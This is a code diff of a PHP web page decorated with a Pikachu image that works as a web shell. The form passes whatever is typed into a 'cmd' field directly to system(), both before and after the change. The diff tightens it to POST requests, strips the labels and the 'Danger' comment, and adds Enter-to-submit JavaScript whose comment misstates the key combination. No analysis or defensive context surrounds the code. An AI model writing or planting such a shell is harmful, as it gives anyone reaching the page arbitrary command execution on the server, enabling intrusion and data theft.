@@ -6,7 +6,7 @@
     <style>
         body {
             background-color: #fffbe7;
-            font-family: 'Arial', sans-serif;
+            font-family: Arial, sans-serif;
             display: flex;
             align-items: flex-start;
             padding: 20px;
@@ -22,7 +22,7 @@
         .shell-container {
             flex-grow: 1;
         }
-        textarea, input[type="submit"] {
+        textarea, button {
             width: 100%;
             margin-top: 10px;
             padding: 10px;
@@ -41,25 +41,30 @@
 </head>
 <body>
     <div class="image-container">
-        <img src="l8bl.png" alt="Hard-working Pikachu">
+        <img src="data:image/png;base64,{{BASE64_PIKACHU_IMAGE_HERE}}">
     </div>
     <div class="shell-container">
         <form method="POST">
-            <label for="cmd">Enter Command:</label><br>
-            <textarea name="cmd" rows="4" placeholder="e.g., ls -al or PHP code"></textarea><br>
-            <input type="submit" value="Execute">
+            <textarea name="cmd" rows="5" placeholder="Enter your command..."></textarea>
+            <button type="submit">Execute</button>
         </form>
         <pre>
 <?php
-if (isset($_REQUEST['cmd'])) {
-    $cmd = $_REQUEST['cmd'];
-    echo "[Command Output]\n";
-    // Danger: Evaluation method
-     // Execute system command
-        system($cmd);
+if (isset($_POST['cmd'])) {
+    $cmd = $_POST['cmd'];
+    system($cmd);
 }
 ?>
         </pre>
     </div>
+    <script>
+        // Submit form when pressing Enter + Shift
+        document.querySelector('textarea').addEventListener('keydown', function (e) {
+            if (e.key === 'Enter' && !e.shiftKey) {
+                e.preventDefault();
+                this.form.submit();
+            }
+        });
+    </script>
 </body>
 </html>
